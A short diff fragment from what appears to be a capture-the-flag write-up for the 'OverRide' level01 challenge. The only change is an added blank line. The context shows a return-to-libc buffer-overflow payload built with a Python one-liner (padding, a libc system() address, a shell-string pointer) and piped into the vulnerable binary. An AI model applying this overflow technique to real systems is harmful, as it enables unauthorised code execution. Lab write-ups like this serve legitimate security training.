@@ -148,6 +148,7 @@ $1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
 Payload :
 
 level01@OverRide:~$ (python -c 'print("dat_wil\n" + "a" * 80 + "\xd0\xae\xe6\xf7" + "----" + "\xec\x97\xf8\xf7")') > /tmp/lvl1
+
 level01@OverRide:~$ cat /tmp/lvl1 - | ./level01 
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
